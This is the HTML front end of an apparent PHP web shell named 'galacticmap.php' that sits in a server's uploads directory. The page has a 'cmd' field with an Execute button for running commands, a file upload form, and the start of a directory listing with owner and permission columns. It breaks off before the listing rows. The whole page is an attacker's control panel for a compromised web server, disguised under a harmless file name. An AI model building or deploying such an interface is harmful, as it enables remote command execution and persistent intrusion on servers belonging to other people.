
<html>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<div class="container">


<h2>Viewing directory /var/www/html/uploads</h2>
<br><form action='/uploads/galacticmap.php' method='GET'><input type='hidden' name='dir' value=/var/www/html/uploads /><input type='text' name='cmd' autocomplete='off' autofocus>
<input type='submit' value='Execute'>
</form>
<br>
<div class='navbar-form'><form action='/uploads/galacticmap.php' method='POST' enctype='multipart/form-data'>
<input type='hidden' name='dir' value=''/> <input type='file' name='fileToUpload' id='fileToUpload'>
<br><input type='submit' value='Upload File' name='submit'></div><br>
<table class="table table-hover table-bordered">
    <thead>
      <tr>
        <th>Name</th>
        <th>Owner</th>
        <th>Permissions</th>
      </tr>
    </thead>
    <tbody>
<tr>